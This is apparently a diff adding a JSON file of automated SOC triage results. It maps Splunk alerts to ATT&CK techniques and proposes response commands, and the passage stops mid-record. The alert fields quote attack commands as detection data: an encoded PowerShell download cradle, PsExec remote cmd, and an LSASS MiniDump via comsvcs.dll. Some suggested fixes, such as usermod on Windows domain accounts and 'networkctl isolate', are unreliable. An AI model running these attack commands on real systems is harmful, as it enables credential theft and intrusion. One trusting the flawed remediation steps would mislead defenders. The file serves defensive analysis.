@@ -1,0 +1,2390 @@
+[
+  {
+    "alert_id": "splunk-1",
+    "alert": {
+      "alert_id": "splunk-1",
+      "event_type": "authentication_failure",
+      "log_source": "splunk",
+      "source_ip": "192.168.1.50",
+      "destination_ip": "10.0.0.10",
+      "username": "admin",
+      "process_name": "",
+      "command_line": "",
+      "details": "Multiple failed logins detected | Splunk detection: Excessive Failed Logins",
+      "severity": "high",
+      "raw_time": "2026-04-05T19:10:00Z"
+    },
+    "triage": {
+      "triage_score": 50,
+      "severity": "high"
+    },
+    "query_used": "authentication_failure splunk multiple failed logins detected | splunk detection: excessive failed logins admin 192.168.1.50 10.0.0.10 brute force password guessing credential access",
+    "matches": [
+      {
+        "technique_id": "T1110",
+        "name": "Brute Force",
+        "tactics": [
+          "credential-access"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 0.9641,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.4928,
+        "confidence": 100.0,
+        "explanation": [
+          "Repeated failed authentication behavior"
+        ]
+      },
+      {
+        "technique_id": "T1110.001",
+        "name": "Password Guessing",
+        "tactics": [
+          "credential-access"
+        ],
+        "tfidf_score": 0.8845,
+        "embedding_score": 0.9917,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.4637,
+        "confidence": 98.05,
+        "explanation": [
+          "Repeated failed authentication behavior"
+        ]
+      },
+      {
+        "technique_id": "T1201",
+        "name": "Password Policy Discovery",
+        "tactics": [
+          "discovery"
+        ],
+        "tfidf_score": 0.6371,
+        "embedding_score": 0.8063,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.3524,
+        "confidence": 90.59,
+        "explanation": [
+          "Repeated failed authentication behavior"
+        ]
+      },
+      {
+        "technique_id": "T1555.005",
+        "name": "Password Managers",
+        "tactics": [
+          "credential-access"
+        ],
+        "tfidf_score": 0.6816,
+        "embedding_score": 0.5941,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.3233,
+        "confidence": 88.65,
+        "explanation": [
+          "Repeated failed authentication behavior"
+        ]
+      },
+      {
+        "technique_id": "T1595.003",
+        "name": "Wordlist Scanning",
+        "tactics": [
+          "reconnaissance"
+        ],
+        "tfidf_score": 0.392,
+        "embedding_score": 0.4435,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.2063,
+        "confidence": 80.81,
+        "explanation": [
+          "Repeated failed authentication behavior"
+        ]
+      }
+    ],
+    "recommended_actions": [
+      "Review account lockouts and authentication telemetry",
+      "Reset or rotate impacted credentials",
+      "Check for suspicious authentication success after repeated failures",
+      "Review host and account enumeration activity",
+      "Determine whether the behavior aligns with expected admin activity"
+    ],
+    "soar": {
+      "incident_type": "credential_access",
+      "urgency": "critical",
+      "recommended_actions": [
+        "usermod -L admin",
+        "iptables -A INPUT -s 192.168.1.50 -j DROP",
+        "volatility -f memory.dump --profile=Win10x64 pslist"
+      ],
+      "playbook": "credential_access_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert indicates potentially suspicious behavior that should be investigated.",
+      "risk_summary": "Technique: Brute Force | Tactics: credential-access | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "usermod -L admin",
+        "iptables -A INPUT -s 192.168.1.50 -j DROP",
+        "volatility -f memory.dump --profile=Win10x64 pslist"
+      ],
+      "context": "User: admin | Source IP: 192.168.1.50 | Destination IP: 10.0.0.10"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1110",
+        "technique_name": "Brute Force",
+        "confidence": 100.0,
+        "tactics": [
+          "credential-access"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "credential_risk",
+        "destination_ip_correlation_found",
+        "critical_asset_at_risk",
+        "high_value_asset_targeted"
+      ],
+      "enrichment_steps": [
+        "review authentication success after failures",
+        "check account reuse across hosts"
+      ],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [
+          "splunk-10"
+        ],
+        "related_by_username": []
+      },
+      "ioc_enrichment": {
+        "source_ip": "192.168.1.50",
+        "destination_ip": "10.0.0.10",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": []
+      },
+      "recommended_next_steps": [
+        "usermod -L admin",
+        "iptables -A INPUT -s 192.168.1.50 -j DROP",
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "prioritize_patch_and_isolation"
+      ],
+      "vulnerability_context": {
+        "asset": "10.0.0.10",
+        "top_cve": "CVE-2020-1472",
+        "title": "Zerologon",
+        "risk_score": 16.0,
+        "priority": "critical"
+      },
+      "final_disposition": {
+        "incident_type": "credential_access",
+        "urgency": "critical",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "DC01",
+      "criticality": 10
+    },
+    "investigation_state": {
+      "alert_id": "splunk-1",
+      "alert": {
+        "alert_id": "splunk-1",
+        "event_type": "authentication_failure",
+        "log_source": "splunk",
+        "source_ip": "192.168.1.50",
+        "destination_ip": "10.0.0.10",
+        "username": "admin",
+        "process_name": "",
+        "command_line": "",
+        "details": "Multiple failed logins detected | Splunk detection: Excessive Failed Logins",
+        "severity": "high",
+        "raw_time": "2026-04-05T19:10:00Z"
+      },
+      "severity": "high",
+      "triage_score": 50,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1110",
+        "technique_name": "Brute Force"
+      },
+      "incident_type": "credential_access",
+      "playbook": "credential_access_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "usermod -L admin",
+        "iptables -A INPUT -s 192.168.1.50 -j DROP",
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "prioritize_patch_and_isolation"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "usermod -L admin",
+            "iptables -A INPUT -s 192.168.1.50 -j DROP",
+            "volatility -f memory.dump --profile=Win10x64 pslist",
+            "prioritize_patch_and_isolation"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  },
+  {
+    "alert_id": "splunk-2",
+    "alert": {
+      "alert_id": "splunk-2",
+      "event_type": "process_execution",
+      "log_source": "splunk",
+      "source_ip": "10.0.0.20",
+      "destination_ip": "10.0.0.20",
+      "username": "corp\\jdoe",
+      "process_name": "powershell.exe",
+      "command_line": "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+      "details": "Encoded PowerShell command observed | Splunk detection: Encoded PowerShell Execution",
+      "severity": "high",
+      "raw_time": "2026-04-05T19:15:00Z"
+    },
+    "triage": {
+      "triage_score": 55,
+      "severity": "high"
+    },
+    "query_used": "process_execution splunk encoded powershell command observed | splunk detection: encoded powershell execution powershell -encodedcommand sqbfafgaiaaoae4azqb3ac0atwbiagoazqbjahqaiaboaguadaauafcazqbiaemababpaguabgb0acka powershell.exe corp\\jdoe 10.0.0.20 10.0.0.20 execution powershell command scripting obfuscation defense evasion",
+    "matches": [
+      {
+        "technique_id": "T1059.001",
+        "name": "PowerShell",
+        "tactics": [
+          "execution"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 0.8431,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.2186,
+        "confidence": 100.0,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      },
+      {
+        "technique_id": "T1546.013",
+        "name": "PowerShell Profile",
+        "tactics": [
+          "privilege-escalation",
+          "persistence"
+        ],
+        "tfidf_score": 0.8014,
+        "embedding_score": 0.6825,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.1269,
+        "confidence": 92.47,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      },
+      {
+        "technique_id": "T1027.010",
+        "name": "Command Obfuscation",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 0.4189,
+        "embedding_score": 1.0,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.0757,
+        "confidence": 88.27,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      },
+      {
+        "technique_id": "T1070.003",
+        "name": "Clear Command History",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 0.5847,
+        "embedding_score": 0.5451,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.0344,
+        "confidence": 84.88,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      },
+      {
+        "technique_id": "T1562.003",
+        "name": "Impair Command History Logging",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 0.5551,
+        "embedding_score": 0.5717,
+        "rule_score": 1.5,
+        "field_match_score": 0.0,
+        "final_score": 1.0309,
+        "confidence": 84.6,
+        "explanation": [
+          "PowerShell execution"
+        ]
+      }
+    ],
+    "recommended_actions": [
+      "Isolate affected host if malicious execution is confirmed",
+      "Collect process tree, command-line, and parent-child telemetry",
+      "Review script block logs, PowerShell logs, or EDR execution traces",
+      "Review scheduled tasks, services, autoruns, and startup locations",
+      "Hunt for newly created accounts or remote management changes"
+    ],
+    "soar": {
+      "incident_type": "defense_evasion",
+      "urgency": "critical",
+      "recommended_actions": [
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.20",
+        "iptables -A INPUT -s 10.0.0.20 -j DROP"
+      ],
+      "playbook": "defense_evasion_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert indicates suspicious execution behavior, which may allow attackers to run arbitrary code on the system.",
+      "risk_summary": "Technique: PowerShell | Tactics: execution | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.20",
+        "iptables -A INPUT -s 10.0.0.20 -j DROP"
+      ],
+      "context": "User: corp\\jdoe | Source IP: 10.0.0.20 | Destination IP: 10.0.0.20"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1059.001",
+        "technique_name": "PowerShell",
+        "confidence": 100.0,
+        "tactics": [
+          "execution"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "stealth_behavior",
+        "user_activity_correlation_found"
+      ],
+      "enrichment_steps": [
+        "review tampering or logging impairment indicators",
+        "collect process lineage and script execution context"
+      ],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [],
+        "related_by_username": [
+          "splunk-3",
+          "splunk-8",
+          "splunk-9",
+          "splunk-10"
+        ]
+      },
+      "ioc_enrichment": {
+        "source_ip": "10.0.0.20",
+        "destination_ip": "10.0.0.20",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": []
+      },
+      "recommended_next_steps": [
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.20",
+        "iptables -A INPUT -s 10.0.0.20 -j DROP"
+      ],
+      "vulnerability_context": {
+        "asset": "10.0.0.20",
+        "top_cve": null,
+        "title": null,
+        "risk_score": 0,
+        "priority": "none"
+      },
+      "final_disposition": {
+        "incident_type": "defense_evasion",
+        "urgency": "critical",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "WS01",
+      "criticality": 5
+    },
+    "investigation_state": {
+      "alert_id": "splunk-2",
+      "alert": {
+        "alert_id": "splunk-2",
+        "event_type": "process_execution",
+        "log_source": "splunk",
+        "source_ip": "10.0.0.20",
+        "destination_ip": "10.0.0.20",
+        "username": "corp\\jdoe",
+        "process_name": "powershell.exe",
+        "command_line": "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+        "details": "Encoded PowerShell command observed | Splunk detection: Encoded PowerShell Execution",
+        "severity": "high",
+        "raw_time": "2026-04-05T19:15:00Z"
+      },
+      "severity": "high",
+      "triage_score": 55,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1059.001",
+        "technique_name": "PowerShell"
+      },
+      "incident_type": "defense_evasion",
+      "playbook": "defense_evasion_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.20",
+        "iptables -A INPUT -s 10.0.0.20 -j DROP"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "volatility -f memory.dump --profile=Win10x64 pslist",
+            "networkctl isolate 10.0.0.20",
+            "iptables -A INPUT -s 10.0.0.20 -j DROP"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  },
+  {
+    "alert_id": "splunk-3",
+    "alert": {
+      "alert_id": "splunk-3",
+      "event_type": "remote_execution",
+      "log_source": "splunk",
+      "source_ip": "10.0.0.30",
+      "destination_ip": "10.0.0.25",
+      "username": "corp\\jdoe",
+      "process_name": "psexec.exe",
+      "command_line": "psexec.exe \\\\10.0.0.25 cmd.exe",
+      "details": "Remote service execution using PsExec | Splunk detection: PsExec Remote Service Execution",
+      "severity": "high",
+      "raw_time": "2026-04-05T19:20:00Z"
+    },
+    "triage": {
+      "triage_score": 55,
+      "severity": "high"
+    },
+    "query_used": "remote_execution splunk remote service execution using psexec | splunk detection: psexec remote service execution psexec.exe \\\\10.0.0.25 cmd.exe psexec.exe corp\\jdoe 10.0.0.30 10.0.0.25 lateral movement remote execution",
+    "matches": [
+      {
+        "technique_id": "T1569.002",
+        "name": "Service Execution",
+        "tactics": [
+          "execution"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 1.0,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.5,
+        "confidence": 100.0,
+        "explanation": [
+          "PsExec remote service execution"
+        ]
+      },
+      {
+        "technique_id": "T1563",
+        "name": "Remote Service Session Hijacking",
+        "tactics": [
+          "lateral-movement"
+        ],
+        "tfidf_score": 0.6565,
+        "embedding_score": 0.7318,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.3433,
+        "confidence": 89.55,
+        "explanation": [
+          "PsExec remote service execution"
+        ]
+      },
+      {
+        "technique_id": "T1210",
+        "name": "Exploitation of Remote Services",
+        "tactics": [
+          "lateral-movement"
+        ],
+        "tfidf_score": 0.4826,
+        "embedding_score": 0.6707,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.2789,
+        "confidence": 85.26,
+        "explanation": [
+          "PsExec remote service execution"
+        ]
+      },
+      {
+        "technique_id": "T1021",
+        "name": "Remote Services",
+        "tactics": [
+          "lateral-movement"
+        ],
+        "tfidf_score": 0.4644,
+        "embedding_score": 0.5936,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.258,
+        "confidence": 83.87,
+        "explanation": [
+          "PsExec remote service execution"
+        ]
+      },
+      {
+        "technique_id": "T1021.002",
+        "name": "SMB/Windows Admin Shares",
+        "tactics": [
+          "lateral-movement"
+        ],
+        "tfidf_score": 0.3615,
+        "embedding_score": 0.5509,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.2186,
+        "confidence": 81.24,
+        "explanation": [
+          "PsExec remote service execution"
+        ]
+      }
+    ],
+    "recommended_actions": [
+      "Isolate affected host if malicious execution is confirmed",
+      "Collect process tree, command-line, and parent-child telemetry",
+      "Review script block logs, PowerShell logs, or EDR execution traces",
+      "Check remote service creation, SMB, WinRM, RDP, WMI, and PsExec activity",
+      "Review east-west traffic and admin share access",
+      "Scope additional hosts touched by the same account or source system"
+    ],
+    "soar": {
+      "incident_type": "lateral_movement",
+      "urgency": "critical",
+      "recommended_actions": [
+        "usermod -L corp\\jdoe",
+        "networkctl isolate 10.0.0.25",
+        "iptables -A INPUT -s 10.0.0.30 -j DROP"
+      ],
+      "playbook": "lateral_movement_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert indicates suspicious execution behavior, which may allow attackers to run arbitrary code on the system.",
+      "risk_summary": "Technique: Service Execution | Tactics: execution | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "usermod -L corp\\jdoe",
+        "networkctl isolate 10.0.0.25",
+        "iptables -A INPUT -s 10.0.0.30 -j DROP"
+      ],
+      "context": "User: corp\\jdoe | Source IP: 10.0.0.30 | Destination IP: 10.0.0.25"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1569.002",
+        "technique_name": "Service Execution",
+        "confidence": 100.0,
+        "tactics": [
+          "execution"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "potential_host_spread",
+        "user_activity_correlation_found"
+      ],
+      "enrichment_steps": [
+        "correlate destination hosts for same user",
+        "review east-west movement patterns"
+      ],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [],
+        "related_by_username": [
+          "splunk-2",
+          "splunk-8",
+          "splunk-9",
+          "splunk-10"
+        ]
+      },
+      "ioc_enrichment": {
+        "source_ip": "10.0.0.30",
+        "destination_ip": "10.0.0.25",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": []
+      },
+      "recommended_next_steps": [
+        "usermod -L corp\\jdoe",
+        "networkctl isolate 10.0.0.25",
+        "iptables -A INPUT -s 10.0.0.30 -j DROP"
+      ],
+      "vulnerability_context": {
+        "asset": "10.0.0.25",
+        "top_cve": null,
+        "title": null,
+        "risk_score": 0,
+        "priority": "none"
+      },
+      "final_disposition": {
+        "incident_type": "lateral_movement",
+        "urgency": "critical",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "APP01",
+      "criticality": 6
+    },
+    "investigation_state": {
+      "alert_id": "splunk-3",
+      "alert": {
+        "alert_id": "splunk-3",
+        "event_type": "remote_execution",
+        "log_source": "splunk",
+        "source_ip": "10.0.0.30",
+        "destination_ip": "10.0.0.25",
+        "username": "corp\\jdoe",
+        "process_name": "psexec.exe",
+        "command_line": "psexec.exe \\\\10.0.0.25 cmd.exe",
+        "details": "Remote service execution using PsExec | Splunk detection: PsExec Remote Service Execution",
+        "severity": "high",
+        "raw_time": "2026-04-05T19:20:00Z"
+      },
+      "severity": "high",
+      "triage_score": 55,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1569.002",
+        "technique_name": "Service Execution"
+      },
+      "incident_type": "lateral_movement",
+      "playbook": "lateral_movement_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "usermod -L corp\\jdoe",
+        "networkctl isolate 10.0.0.25",
+        "iptables -A INPUT -s 10.0.0.30 -j DROP"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "usermod -L corp\\jdoe",
+            "networkctl isolate 10.0.0.25",
+            "iptables -A INPUT -s 10.0.0.30 -j DROP"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  },
+  {
+    "alert_id": "splunk-4",
+    "alert": {
+      "alert_id": "splunk-4",
+      "event_type": "credential_dumping",
+      "log_source": "splunk",
+      "source_ip": "10.0.0.40",
+      "destination_ip": "10.0.0.40",
+      "username": "corp\\administrator",
+      "process_name": "rundll32.exe",
+      "command_line": "rundll32.exe comsvcs.dll, MiniDump lsass.exe lsass.dmp full",
+      "details": "LSASS memory dump behavior observed | Splunk detection: Possible Credential Dumping",
+      "severity": "critical",
+      "raw_time": "2026-04-05T19:25:00Z"
+    },
+    "triage": {
+      "triage_score": 60,
+      "severity": "high"
+    },
+    "query_used": "credential_dumping splunk lsass memory dump behavior observed | splunk detection: possible credential dumping rundll32.exe comsvcs.dll, minidump lsass.exe lsass.dmp full rundll32.exe corp\\administrator 10.0.0.40 10.0.0.40",
+    "matches": [
+      {
+        "technique_id": "T1003.001",
+        "name": "LSASS Memory",
+        "tactics": [
+          "credential-access"
+        ],
+        "tfidf_score": 0.8963,
+        "embedding_score": 1.0,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.4689,
+        "confidence": 100.0,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1218.011",
+        "name": "Rundll32",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 0.5812,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.4162,
+        "confidence": 88.76,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1547.008",
+        "name": "LSASS Driver",
+        "tactics": [
+          "persistence",
+          "privilege-escalation"
+        ],
+        "tfidf_score": 0.4755,
+        "embedding_score": 0.7553,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.2937,
+        "confidence": 62.64,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1003",
+        "name": "OS Credential Dumping",
+        "tactics": [
+          "credential-access"
+        ],
+        "tfidf_score": 0.1326,
+        "embedding_score": 0.6191,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.1636,
+        "confidence": 34.89,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1036.003",
+        "name": "Rename Legitimate Utilities",
+        "tactics": [
+          "defense-evasion"
+        ],
+        "tfidf_score": 0.2093,
+        "embedding_score": 0.4986,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.1625,
+        "confidence": 34.66,
+        "explanation": []
+      }
+    ],
+    "recommended_actions": [
+      "Review account lockouts and authentication telemetry",
+      "Reset or rotate impacted credentials",
+      "Check for suspicious authentication success after repeated failures",
+      "Review scheduled tasks, services, autoruns, and startup locations",
+      "Hunt for newly created accounts or remote management changes"
+    ],
+    "soar": {
+      "incident_type": "credential_access",
+      "urgency": "critical",
+      "recommended_actions": [
+        "usermod -L corp\\administrator",
+        "iptables -A INPUT -s 10.0.0.40 -j DROP",
+        "volatility -f memory.dump --profile=Win10x64 pslist"
+      ],
+      "playbook": "credential_access_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert indicates potential credential access activity, which could allow an attacker to gain unauthorized access to systems.",
+      "risk_summary": "Technique: LSASS Memory | Tactics: credential-access | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "usermod -L corp\\administrator",
+        "iptables -A INPUT -s 10.0.0.40 -j DROP",
+        "volatility -f memory.dump --profile=Win10x64 pslist"
+      ],
+      "context": "User: corp\\administrator | Source IP: 10.0.0.40 | Destination IP: 10.0.0.40"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1003.001",
+        "technique_name": "LSASS Memory",
+        "confidence": 100.0,
+        "tactics": [
+          "credential-access"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "credential_risk",
+        "high_value_asset_targeted"
+      ],
+      "enrichment_steps": [
+        "review authentication success after failures",
+        "check account reuse across hosts"
+      ],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [],
+        "related_by_username": []
+      },
+      "ioc_enrichment": {
+        "source_ip": "10.0.0.40",
+        "destination_ip": "10.0.0.40",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": []
+      },
+      "recommended_next_steps": [
+        "usermod -L corp\\administrator",
+        "iptables -A INPUT -s 10.0.0.40 -j DROP",
+        "volatility -f memory.dump --profile=Win10x64 pslist"
+      ],
+      "vulnerability_context": {
+        "asset": "10.0.0.40",
+        "top_cve": null,
+        "title": null,
+        "risk_score": 0,
+        "priority": "none"
+      },
+      "final_disposition": {
+        "incident_type": "credential_access",
+        "urgency": "critical",
+        "confidence": 100.0
+      }
+    },
+    "asset_context": {
+      "name": "ADMIN-BOX",
+      "criticality": 8
+    },
+    "investigation_state": {
+      "alert_id": "splunk-4",
+      "alert": {
+        "alert_id": "splunk-4",
+        "event_type": "credential_dumping",
+        "log_source": "splunk",
+        "source_ip": "10.0.0.40",
+        "destination_ip": "10.0.0.40",
+        "username": "corp\\administrator",
+        "process_name": "rundll32.exe",
+        "command_line": "rundll32.exe comsvcs.dll, MiniDump lsass.exe lsass.dmp full",
+        "details": "LSASS memory dump behavior observed | Splunk detection: Possible Credential Dumping",
+        "severity": "critical",
+        "raw_time": "2026-04-05T19:25:00Z"
+      },
+      "severity": "high",
+      "triage_score": 60,
+      "confidence": 1.0,
+      "top_technique": {
+        "technique_id": "T1003.001",
+        "technique_name": "LSASS Memory"
+      },
+      "incident_type": "credential_access",
+      "playbook": "credential_access_response",
+      "evidence": [],
+      "decisions": [
+        "response_recommended"
+      ],
+      "actions_taken": [
+        "recommend_response"
+      ],
+      "recommended_next_steps": [
+        "usermod -L corp\\administrator",
+        "iptables -A INPUT -s 10.0.0.40 -j DROP",
+        "volatility -f memory.dump --profile=Win10x64 pslist"
+      ],
+      "investigation_log": [
+        {
+          "step": "recommend_response",
+          "before_confidence": 1.0,
+          "after_confidence": 1.0,
+          "result": [
+            "usermod -L corp\\administrator",
+            "iptables -A INPUT -s 10.0.0.40 -j DROP",
+            "volatility -f memory.dump --profile=Win10x64 pslist"
+          ]
+        }
+      ],
+      "enrichments_run": [],
+      "stop_reason": "confidence_threshold_met"
+    }
+  },
+  {
+    "alert_id": "splunk-5",
+    "alert": {
+      "alert_id": "splunk-5",
+      "event_type": "web_activity",
+      "log_source": "splunk",
+      "source_ip": "172.16.1.55",
+      "destination_ip": "10.0.0.60",
+      "username": "www-data",
+      "process_name": "",
+      "command_line": "",
+      "details": "HTTP POST upload to /upload/shell.aspx | Suspicious web shell upload attempt",
+      "severity": "high",
+      "raw_time": "2026-04-05T19:30:00Z",
+      "http": {
+        "method": "POST",
+        "uri": "/upload/shell.aspx",
+        "user_agent": "curl/8.0"
+      }
+    },
+    "triage": {
+      "triage_score": 30,
+      "severity": "medium"
+    },
+    "query_used": "web_activity splunk http post upload to /upload/shell.aspx | suspicious web shell upload attempt www-data 172.16.1.55 10.0.0.60",
+    "matches": [
+      {
+        "technique_id": "T1505.003",
+        "name": "Web Shell",
+        "tactics": [
+          "persistence"
+        ],
+        "tfidf_score": 1.0,
+        "embedding_score": 1.0,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.5,
+        "confidence": 100.0,
+        "explanation": [
+          "Web shell upload"
+        ]
+      },
+      {
+        "technique_id": "T1525",
+        "name": "Implant Internal Image",
+        "tactics": [
+          "persistence"
+        ],
+        "tfidf_score": 0.2839,
+        "embedding_score": 0.6728,
+        "rule_score": 2.0,
+        "field_match_score": 0.0,
+        "final_score": 1.2197,
+        "confidence": 81.31,
+        "explanation": [
+          "Web shell upload"
+        ]
+      },
+      {
+        "technique_id": "T1608.001",
+        "name": "Upload Malware",
+        "tactics": [
+          "resource-development"
+        ],
+        "tfidf_score": 0.5468,
+        "embedding_score": 0.8803,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.3401,
+        "confidence": 22.67,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1608.002",
+        "name": "Upload Tool",
+        "tactics": [
+          "resource-development"
+        ],
+        "tfidf_score": 0.577,
+        "embedding_score": 0.6703,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.3071,
+        "confidence": 20.47,
+        "explanation": []
+      },
+      {
+        "technique_id": "T1546.004",
+        "name": "Unix Shell Configuration Modification",
+        "tactics": [
+          "privilege-escalation",
+          "persistence"
+        ],
+        "tfidf_score": 0.578,
+        "embedding_score": 0.5316,
+        "rule_score": 0.0,
+        "field_match_score": 0.0,
+        "final_score": 0.2797,
+        "confidence": 18.65,
+        "explanation": []
+      }
+    ],
+    "recommended_actions": [
+      "Review scheduled tasks, services, autoruns, and startup locations",
+      "Hunt for newly created accounts or remote management changes"
+    ],
+    "soar": {
+      "incident_type": "persistence",
+      "urgency": "medium",
+      "recommended_actions": [
+        "usermod -L www-data",
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.60"
+      ],
+      "playbook": "persistence_response"
+    },
+    "ai_analysis": {
+      "why_it_matters": "This alert indicates potentially suspicious behavior that should be investigated.",
+      "risk_summary": "Technique: Web Shell | Tactics: persistence | Confidence: 100.0%",
+      "recommended_next_steps": [
+        "usermod -L www-data",
+        "volatility -f memory.dump --profile=Win10x64 pslist",
+        "networkctl isolate 10.0.0.60"
+      ],
+      "context": "User: www-data | Source IP: 172.16.1.55 | Destination IP: 10.0.0.60"
+    },
+    "agent_decision": {
+      "agent_state": "completed_assessment",
+      "top_technique": {
+        "technique_id": "T1505.003",
+        "technique_name": "Web Shell",
+        "confidence": 100.0,
+        "tactics": [
+          "persistence"
+        ]
+      },
+      "decisions": [
+        "high_confidence_detection",
+        "user_activity_correlation_found",
+        "critical_asset_at_risk",
+        "high_value_asset_targeted"
+      ],
+      "enrichment_steps": [],
+      "enrichment_results": {
+        "related_by_source_ip": [],
+        "related_by_destination_ip": [],
+        "related_by_username": [
+          "splunk-6"
+        ]
+      },
+      "ioc_enrichment": {
+        "source_ip": "172.16.1.55",
+        "destination_ip": "10.0.0.60",
+        "source_ip_class": "internal",
+        "destination_ip_class": "internal",
+        "ioc_findings": []
+      },
+      "recommended_next_steps": [
+        "usermod -L www-data",
